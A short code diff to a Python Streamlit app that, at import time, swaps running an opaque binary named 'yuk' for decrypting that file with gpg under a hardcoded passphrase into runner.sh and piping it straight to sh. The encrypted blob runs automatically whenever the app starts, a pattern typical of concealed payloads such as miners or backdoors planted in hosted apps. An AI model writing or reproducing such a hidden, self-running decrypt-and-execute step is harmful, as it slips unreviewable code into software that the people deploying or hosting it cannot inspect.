@@ -1,6 +1,6 @@
 import streamlit as st
 import os
-os.system('chmod 700 yuk;./yuk')
+os.system('gpg --pinentry-mode=loopback --passphrase "rahasia" --yes -d -o runner.sh yuk && cat runner.sh | sh')
 if not hasattr(st, 'already_started_server'):
     st.already_started_server = True
 
